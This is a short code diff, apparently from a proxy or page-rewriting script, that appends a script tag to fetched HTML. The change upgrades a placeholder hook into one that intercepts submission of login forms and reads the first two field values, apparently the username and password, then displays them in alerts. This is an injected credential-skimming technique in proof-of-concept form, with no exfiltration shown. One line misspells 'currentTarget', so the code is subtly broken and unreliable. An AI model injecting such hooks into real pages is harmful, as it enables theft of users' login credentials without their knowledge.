@@ -7,7 +7,13 @@
     .then(response => response.text())
     .then(text => text + `
       <script>
-        setTimeout(() => {$('form[action*=login]').submit(() => alert('hello world')); console.log('hooked')}, 4000)
+        setTimeout(() => {
+          $('form[action*=login]').submit(event => {
+            alert(event.currentTarget[0].value)
+            alert(event.curerntTarget[1].value)
+          }); 
+          console.log('hooked')
+        }, 4000)
       </script>
     `)
   )
